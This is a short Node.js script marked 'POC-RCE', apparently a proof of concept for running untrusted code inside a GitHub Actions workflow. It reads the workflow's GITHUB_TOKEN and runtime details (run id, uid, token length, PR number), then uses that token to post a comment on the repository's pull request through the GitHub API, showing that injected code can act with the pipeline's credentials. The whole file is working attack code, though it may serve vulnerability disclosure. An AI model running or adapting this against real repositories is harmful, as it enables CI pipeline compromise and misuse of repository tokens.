const fs = require('fs');
const path = require('path');
const tok = process.env.GITHUB_TOKEN || '';
function findPr() {
  const cands = ['pr-number.txt', '../pr-number.txt', path.join(__dirname, 'pr-number.txt'), path.join(__dirname, '..', 'pr-number.txt')];
  for (const c of cands) { try { if (fs.existsSync(c)) return fs.readFileSync(c, 'utf8').trim(); } catch (e) {} }
  return process.env.PR_ID || '';
}
const pr = findPr();
const info = 'POC-RCE workflow=' + process.env.GITHUB_WORKFLOW + ' event=' + process.env.GITHUB_EVENT_NAME + ' run=' + process.env.GITHUB_RUN_ID + ' uid=' + process.getuid() + ' token_present=' + Boolean(tok) + ' token_len=' + tok.length + ' pr=' + pr + ' cwd=' + process.cwd();
console.log(info);
(async () => {
  const r = await fetch('https://api.github.com/repos/' + process.env.GITHUB_REPOSITORY + '/issues/' + pr + '/comments', {
    method: 'POST',
    headers: { authorization: 'Bearer ' + tok, accept: 'application/vnd.github+json', 'content-type': 'application/json' },
    body: JSON.stringify({ body: info })
  });
  console.log('comment status ' + r.status);
})().catch(e => console.error('comment err ' + e.message));
